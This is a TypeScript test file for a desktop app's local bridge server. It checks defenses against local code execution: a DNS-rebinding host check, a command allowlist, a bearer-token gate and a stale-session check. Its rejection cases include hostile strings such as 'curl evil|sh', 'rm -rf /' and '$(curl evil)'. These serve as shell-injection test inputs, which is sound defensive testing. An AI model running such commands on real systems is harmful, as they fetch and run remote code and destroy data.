/**
 * Local-RCE hardening for the bridge server (per-session bearer token + DNS-
 * rebinding host check + command allowlist). These assert the PURE predicates
 * the request handler gates on — the same pattern used by notify-routing.test.ts
 * (the full server pulls in electron / node-pty, so we test the seams).
 *
 * Threat: the bridge's /spawn-agent + /dispatch-task can launch a process with
 * an attacker-chosen command/cwd at the user's privilege. Without these gates a
 * local process — or a web page abusing DNS-rebinding / port brute-forcing
 * 127.0.0.1 — could drive it into local code execution.
 */
import { describe, it, expect } from "vitest";
import {
  isLoopbackHost,
  isAllowedSpawnCommand,
  bearerTokenMatches,
  ALLOWED_SPAWN_COMMANDS,
  validateOrchestratorSessionIdentity,
} from "../../electron/bridge-server";

describe("isLoopbackHost — DNS-rebinding defense", () => {
  it("accepts loopback hosts (with/without port, IPv6)", () => {
    expect(isLoopbackHost("127.0.0.1")).toBe(true);
    expect(isLoopbackHost("127.0.0.1:54321")).toBe(true);
    expect(isLoopbackHost("localhost")).toBe(true);
    expect(isLoopbackHost("localhost:8080")).toBe(true);
    expect(isLoopbackHost("LOCALHOST")).toBe(true);
    expect(isLoopbackHost("[::1]")).toBe(true);
    expect(isLoopbackHost("[::1]:3000")).toBe(true);
    expect(isLoopbackHost("::1")).toBe(true);
  });

  it("rejects non-loopback / rebound hosts and missing Host", () => {
    expect(isLoopbackHost(undefined)).toBe(false);
    expect(isLoopbackHost("")).toBe(false);
    expect(isLoopbackHost("attacker.com")).toBe(false);
    expect(isLoopbackHost("attacker.com:54321")).toBe(false);
    // A non-loopback LAN address must not pass.
    expect(isLoopbackHost("192.168.0.10")).toBe(false);
    expect(isLoopbackHost("127.0.0.1.evil.com")).toBe(false);
  });
});

describe("isAllowedSpawnCommand — arbitrary-command RCE guard", () => {
  it("allows empty/undefined (falls back to getDefaultCommand)", () => {
    expect(isAllowedSpawnCommand(undefined)).toBe(true);
    expect(isAllowedSpawnCommand("")).toBe(true);
    expect(isAllowedSpawnCommand("   ")).toBe(true);
  });

  it("allows known fleet CLIs, bare or absolute", () => {
    for (const cmd of ALLOWED_SPAWN_COMMANDS) {
      expect(isAllowedSpawnCommand(cmd)).toBe(true);
      expect(isAllowedSpawnCommand(`/usr/local/bin/${cmd}`)).toBe(true);
    }
  });

  it("rejects arbitrary commands, args, and shell injection", () => {
    expect(isAllowedSpawnCommand("node")).toBe(false);
    expect(isAllowedSpawnCommand("sh")).toBe(false);
    expect(isAllowedSpawnCommand("sh -c 'curl evil|sh'")).toBe(false);
    expect(isAllowedSpawnCommand("claude; rm -rf /")).toBe(false);
    expect(isAllowedSpawnCommand("claude --dangerously")).toBe(false);
    expect(isAllowedSpawnCommand("claude && curl evil")).toBe(false);
    expect(isAllowedSpawnCommand("$(curl evil)")).toBe(false);
    expect(isAllowedSpawnCommand("`whoami`")).toBe(false);
  });

  it("matches on basename — absolute path to a known CLI is allowed", () => {
    // The bearer-token gate is the primary control; the command allowlist is
    // defense-in-depth that blocks arbitrary binaries/args by basename. An
    // absolute path whose basename is a known CLI is permitted (legit launchers
    // may resolve "claude" to /usr/local/bin/claude).
    expect(isAllowedSpawnCommand("/tmp/claude")).toBe(true);
    expect(isAllowedSpawnCommand("/tmp/evil")).toBe(false);
  });
});

describe("bearerTokenMatches — auth gate", () => {
  const token = "a".repeat(64);

  it("accepts exactly Bearer <token> (case-insensitive scheme)", () => {
    expect(bearerTokenMatches(`Bearer ${token}`, token)).toBe(true);
    expect(bearerTokenMatches(`bearer ${token}`, token)).toBe(true);
  });

  it("rejects missing, malformed, or wrong tokens", () => {
    expect(bearerTokenMatches(undefined, token)).toBe(false);
    expect(bearerTokenMatches("", token)).toBe(false);
    expect(bearerTokenMatches(token, token)).toBe(false); // no scheme
    expect(bearerTokenMatches(`Bearer ${"b".repeat(64)}`, token)).toBe(false);
    expect(bearerTokenMatches(`Bearer ${token}x`, token)).toBe(false);
    expect(bearerTokenMatches(["Bearer x", "Bearer y"], token)).toBe(false);
  });

  it("fails closed when no token is configured", () => {
    expect(bearerTokenMatches(`Bearer ${token}`, "")).toBe(false);
  });
});

describe("validateOrchestratorSessionIdentity — stale orchestrator guard", () => {
  it("accepts only the currently registered orchestrator PTY", () => {
    expect(
      validateOrchestratorSessionIdentity({
        expectedPtySessionId: "pty-new",
        currentSession: { ptySessionId: "pty-new", status: "running" },
      }),
    ).toMatchObject({ valid: true });

    expect(
      validateOrchestratorSessionIdentity({
        expectedPtySessionId: "pty-old",
        currentSession: { ptySessionId: "pty-new", status: "running" },
      }),
    ).toMatchObject({
      valid: false,
      reason: "stale orchestrator PTY session",
      currentPtySessionId: "pty-new",
    });
  });

  it("fails closed when the caller has no PTY identity or no live session exists", () => {
    expect(
      validateOrchestratorSessionIdentity({
        expectedPtySessionId: "",
        currentSession: { ptySessionId: "pty-new", status: "running" },
      }),
    ).toMatchObject({
      valid: false,
      reason: "missing orchestrator PTY session id",
    });

    expect(
      validateOrchestratorSessionIdentity({
        expectedPtySessionId: "pty-old",
        currentSession: null,
      }),
    ).toMatchObject({
      valid: false,
      reason: "orchestrator session is not running",
    });
  });
});
